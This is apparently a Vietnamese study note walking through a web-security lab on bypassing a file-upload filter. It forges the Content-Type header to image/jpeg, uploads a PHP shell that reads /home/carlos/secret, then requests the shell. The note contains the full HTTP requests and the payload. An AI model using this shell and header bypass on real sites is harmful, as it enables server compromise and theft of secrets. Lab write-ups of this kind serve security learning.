![[upload-contenttype.png]]
Lab đổi Content-Type thành image/jpeg để qua filter.

> [!NOTE] phân tích đề
> - lab vẫn cho up `.php` nhưng check Content-Type.
> - sau khi quan sát ... mình thấy up `shell.php` với type php là bị chặn.
> - -> báo chỉ cho image.
> - nên mình đoán nó chỉ check header thôi.
> - -> chứ không check nội dung thật.
> - liên quan: [[lys thuyet file upload]] , [[Lab-File upload unrestricted]]

### hướng giải
- [ ] login `wiener:peter`.
- [ ] up `shell.php` bình thường để xem lỗi.
- [ ] intercept rồi sửa `Content-Type` thành `image/jpeg`.
- [ ] forward, ghi lại path.
- [ ] GET tới shell để đọc secret.

### giải
- request gốc bị chặn:
```http
POST /my-account/avatar HTTP/1.1
Content-Type: multipart/form-data; boundary=----abc

------abc
Content-Disposition: form-data; name="avatar"; filename="shell.php"
Content-Type: application/x-php

<?php echo file_get_contents('/home/carlos/secret'); ?>
------abc--
```
- response: `Only image/jpeg allowed`.
- mình sửa lại 1 dòng thôi:
```http
Content-Disposition: form-data; name="avatar"; filename="shell.php"
Content-Type: image/jpeg
```
- -> giữ nguyên filename `.php` + nội dung php.
- response:
```html
File uploaded to /files/avatars/shell.php
```
- mình GET:
```http
GET /files/avatars/shell.php HTTP/1.1
```
- response ra secret luôn.
- kết quả: bypass chỉ bằng 1 header.

> [!NOTE] bài học
> - check Content-Type là check input user.
> - nên mình luôn thử đổi thành `image/jpeg` trước.
> - đừng tin filter phía client.
> - tiếp: [[Lab-File upload extension bypass]]
